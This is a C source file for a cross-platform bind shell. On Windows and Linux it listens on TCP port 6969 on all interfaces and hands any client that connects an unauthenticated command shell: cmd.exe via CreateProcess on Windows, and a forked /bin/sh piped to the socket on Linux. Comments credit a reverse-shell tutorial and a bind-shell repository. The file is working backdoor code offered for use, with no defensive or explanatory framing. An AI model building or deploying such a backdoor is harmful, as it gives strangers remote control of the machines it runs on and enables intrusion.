#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

#define NUM_THREADS 4
#define DEFAULT_BUFFER 1024
#define DEFAULT_PORT 6969

//Code sourced from:
//https://github.com/likle/cargs/tree/master

#ifdef _WIN32

// Code modified from source:
// https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif //WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h> // freeaddrinfo()
#include <tchar.h> // _T()

#if defined(_MSC_VER) || defined(__BORLANDC__)
#pragma comment(lib, "Ws2_32.lib")
#endif //_MSC_VER || __BORLANDC__

#define DEFAULT_BUFLEN 1024

int run(int argc, char** argv){
	SOCKET s,cs;
	WSADATA ws;
	struct sockaddr_in server;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	int iResult = WSAStartup(MAKEWORD(2,2), &ws);
	if(iResult != NO_ERROR){
		printf("[ERROR]: WSAStartup failed with error: %d\n", iResult);//!Debugging
		return iResult;
	}
	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(s == INVALID_SOCKET){
		printf("[ERROR]: WSASocket failed with error: %d\n", WSAGetLastError());//!Debugging
		WSACleanup();
		return iResult;
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(DEFAULT_PORT);
	server.sin_addr.s_addr = INADDR_ANY;//inet_addr("127.0.0.1");
	iResult = bind(s, (struct sockaddr*)&server, sizeof(server));
	if(iResult == SOCKET_ERROR){
		printf("[ERROR]: Bind failed with error: %d\n", WSAGetLastError());//!Debugging
		freeaddrinfo((struct addrinfo*)&server);
		iResult = closesocket(s);
		if(iResult == SOCKET_ERROR)
			printf("[ERROR]: closesocket failed with error %d.\n", WSAGetLastError());//!Debugging
		WSACleanup();
		return iResult;
	}
	iResult = listen(s, SOMAXCONN);
	if(iResult == SOCKET_ERROR){
		printf("[ERROR]: listen failed with error %d.\n", WSAGetLastError());//!Debugging
		WSACleanup();
		return iResult;
	}
	cs = WSAAccept(s, NULL, NULL, NULL, 0);
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)cs;
	LPTSTR cmdPath = _T("C:\\Windows\\System32\\cmd.exe");
	CreateProcess(NULL, cmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	WSACleanup();
	return EXIT_SUCCESS;
}
#else
// Just going to assume it's Linux.
// Code modified from source:
// https://github.com/0x1CA3/bind/blob/main/bind.c
// https://stackoverflow.com/questions/21405204/multithread-server-client-implementation-in-c

#include <string.h>
#include <pthread.h>// -lpthread

#include <fcntl.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>

void *connection_handler(void *socket_desc);
int run(int argc, char** argv){
	int serverFileDescriptor, connection, *nextSocket;
	struct sockaddr_in server, client;
	socklen_t c;
	serverFileDescriptor = socket(AF_INET, SOCK_STREAM, 0);
	if(serverFileDescriptor < 0){
		fprintf(stderr, "[ERROR]: Failed to create socket.\n");//!Debugging
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = htonl(INADDR_ANY);
	server.sin_port = htons(DEFAULT_PORT);
	if (bind(serverFileDescriptor, (struct sockaddr *)&server, sizeof(server)) != 0) {
		fprintf(stderr, "[ERROR]: Bind error!\n");//!Debugging
		exit(EXIT_FAILURE);
	}
	if (listen(serverFileDescriptor, 2) != 0) {
		fprintf(stderr, "[ERROR]: Listening error!\n");//!Debugging
		close(serverFileDescriptor);
		exit(EXIT_FAILURE);
	}
	c = (socklen_t)sizeof(struct sockaddr_in);
	while(1){
		printf("[DEBUG]: Main loop start.\n");//!Debugging
		while(connection = accept(serverFileDescriptor, (struct sockaddr*)&client, &c)){
			printf("[DEBUG]: Client loop start.\n");//!Debugging
			pthread_t connectionThread;
			nextSocket = malloc(1);
			if(!nextSocket){
				fprintf(stderr, "[ERROR]: Failed to allocate socket memory.\n");
				break;
			}
			*nextSocket = connection;
			if(pthread_create(&connectionThread, NULL, connection_handler, (void*)nextSocket) < 0){
				fprintf(stderr, "[ERROR]: Failed to create thread to handle client connection.\n");
				break;
			}
			printf("[DEBUG]: Kicked off a thread worker for client connection.\n");//!Debugging
		}
		if(connection < 0){
			fprintf(stderr, "[ERROR]: Client connection accept() failed.\n");//!Debugging
			break;
		}
		printf("[DEBUG]: Main loop stop.\n");//!Debugging
	}
	// Unreachable code
	close(serverFileDescriptor);
	return EXIT_SUCCESS;
}

// https://stackoverflow.com/a/2917911
int setnonblock(int sock) {
	int flags;
	flags = fcntl(sock, F_GETFL, 0);
	if (-1 == flags)
		return -1;
	return fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

void *connection_handler(void* socketDesc){
	printf("[DEBUG]: Connection handler start.\n");//!Debugging
	int clientSocket = (*(int*)socketDesc);

	// Works but single threaded
	//for (int i = 0; i < 3; i++) {
	//	dup2(clientSocket, i);
	//}
	//char * const* blank = (char * const*)"\0\0\0\0\0\0\0\0";
	//execve("/bin/sh", blank, blank);

	//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

	//FILE* shell = popen("/bin/sh 2>&1", "r");//Can only read or write not both.

	pid_t childPID;
	int inputPipeFD[2];
	int outputPipeFD[2];
	char buffer[DEFAULT_BUFFER];
	int status;
	ssize_t sizeResult = 0u;

	pipe(inputPipeFD);
	pipe(outputPipeFD);
	childPID = fork();

	if(childPID == -1){
		fprintf(stderr, "[ERROR]: Process failed to fork.\n");//Debugging
		close(clientSocket);
		return NULL;
	}
	if(childPID == 0){
		// I am child ga-ga goo-goo
		dup2(outputPipeFD[0], STDIN_FILENO);
		dup2(inputPipeFD[1], STDOUT_FILENO);
		dup2(inputPipeFD[1], STDERR_FILENO);
		// Ask kernel to deliver SIGTERM in case the parent dies
		prctl(PR_SET_PDEATHSIG, SIGTERM);
		// Close unused pipe ends
		close(outputPipeFD[1]);
		close(inputPipeFD[0]);
		execl("/bin/sh", "sh", (char*)NULL);
		printf("[ERROR]: Child shell stream encountered an error. Child fork is exiting.\n");//!Debugging
		return NULL;
	}
	// I am an adult!
	// Close unused pipe ends
	close(outputPipeFD[0]);
	close(inputPipeFD[1]);
	//setnonblock(inputPipeFD[0]);//Doesn't work?
	//setnonblock(clientSocket);//Doesn't work?
	while(getpgid(childPID) >= 0){
		do{
			printf("[DEBUG]: Parent is awaiting input from client.\n");//!Debugging
			sizeResult = read(clientSocket, buffer, DEFAULT_BUFFER);
			printf("[DEBUG]: Socket Buffer: %.*s", sizeResult, buffer);//!Debugging
			write(outputPipeFD[1], buffer, sizeResult);
		} while(sizeResult >= DEFAULT_BUFFER);//Read from socket to shell until done.
		do{
			sizeResult = read(inputPipeFD[0], buffer, DEFAULT_BUFFER);
			printf("[DEBUG]: Shell Buffer: %.*s", sizeResult, buffer);//!Debugging
			write(clientSocket, buffer, sizeResult);
		} while(sizeResult >= DEFAULT_BUFFER);//Write to socket from shell until nothing is read.
		if(sizeResult == 0u)
			break;
	}
	printf("[DEBUG]: Command returned 0 output.\n");//!Debugging
	kill(childPID, SIGKILL); // Send SIGKILL signal to the child process
	waitpid(childPID, &status, 0);
	close(clientSocket);
	printf("[DEBUG]: Connection handler stop.\n");//!Debugging
}

#endif //_WIN32

// Main function
int main(int argc, char** argv) {
	return run(argc, argv);
}
